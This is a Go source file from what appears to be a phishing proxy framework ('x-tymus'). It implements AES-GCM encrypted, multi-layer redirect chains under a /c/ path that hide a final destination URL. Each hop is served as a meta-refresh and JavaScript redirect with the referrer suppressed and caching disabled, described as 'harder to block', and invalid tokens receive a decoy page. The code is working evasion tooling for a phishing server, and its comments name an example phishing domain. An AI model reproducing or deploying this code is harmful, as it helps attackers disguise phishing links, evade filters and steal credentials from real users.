package core

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/elazarl/goproxy"
	"github.com/x-tymus/x-tymus/log"
)

const redirectChainPathPrefix = "/c/"

// encodeRedirectHop encrypts nextURL with AES-GCM using the server secret and
// returns a URL-safe base64 token suitable for use in /c/<token>.
func encodeRedirectHop(nextURL string, secret []byte) (string, error) {
	key := secret
	if len(key) < 16 {
		return "", fmt.Errorf("redirect chain secret too short")
	}
	key = key[:16] // AES-128

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	ciphertext := gcm.Seal(nonce, nonce, []byte(nextURL), nil)
	return base64.RawURLEncoding.EncodeToString(ciphertext), nil
}

// decodeRedirectHop decodes a /c/<token> token back to the next URL.
func decodeRedirectHop(token string, secret []byte) (string, error) {
	key := secret
	if len(key) < 16 {
		return "", fmt.Errorf("redirect chain secret too short")
	}
	key = key[:16]

	data, err := base64.RawURLEncoding.DecodeString(token)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	if len(data) < gcm.NonceSize() {
		return "", fmt.Errorf("token too short")
	}
	nonce, ciphertext := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	plain, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

// GenerateRedirectChain builds a layered redirect chain that terminates at
// finalURL. It returns the outermost (shareable) URL.
//
//   depth=1 → /c/<token_that_decodes_to_finalURL>
//   depth=3 → /c/<t1> → /c/<t2> → /c/<t3> → finalURL
//
// baseURL is the scheme+host of the phishing server, e.g. "https://portal.xcgvhjbknl.store".
func GenerateRedirectChain(baseURL, finalURL string, depth int, secret []byte) (string, []string, error) {
	if depth < 1 {
		depth = 1
	}
	if depth > 10 {
		depth = 10
	}

	// Build chain from inside out: start with finalURL, wrap depth times.
	current := finalURL
	hops := make([]string, depth)

	for i := depth - 1; i >= 0; i-- {
		token, err := encodeRedirectHop(current, secret)
		if err != nil {
			return "", nil, fmt.Errorf("layer %d: %v", i+1, err)
		}
		hopURL := baseURL + redirectChainPathPrefix + token
		hops[i] = hopURL
		current = hopURL
	}

	// hops[0] is the outermost (share this), hops[depth-1] → finalURL
	return hops[0], hops, nil
}

// handleRedirectChainRequest checks if the request path starts with /c/ and
// processes the redirect hop. Returns (true, req, resp) if handled, (false, nil, nil)
// if not a chain request.
func handleRedirectChainRequest(req *http.Request, secret []byte) (bool, *http.Request, *http.Response) {
	if !strings.HasPrefix(req.URL.Path, redirectChainPathPrefix) {
		return false, nil, nil
	}

	token := strings.TrimPrefix(req.URL.Path, redirectChainPathPrefix)
	token = strings.TrimRight(token, "/")

	nextURL, err := decodeRedirectHop(token, secret)
	if err != nil {
		log.Warning("redirect chain: invalid token from %s: %v", req.RemoteAddr, err)
		rq, rs := DecoyResponse(req)
		return true, rq, rs
	}

	log.Debug("redirect chain hop: %s → %s", req.RemoteAddr, nextURL)

	// Use a meta-refresh + JS redirect (no referrer leak, harder to block).
	body := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0;url=%s">
<meta name="referrer" content="no-referrer">
<script>
(function(){
  var t="%s";
  try{history.replaceState(null,'',t)}catch(e){}
  top.location.replace(t);
})();
</script>
</head>
<body></body>
</html>`, nextURL, nextURL)

	resp := goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, body)
	if resp != nil {
		resp.Header.Set("Cache-Control", "no-store, no-cache")
		resp.Header.Set("Pragma", "no-cache")
		resp.Header.Del("Referrer-Policy")
	}
	return true, req, resp
}
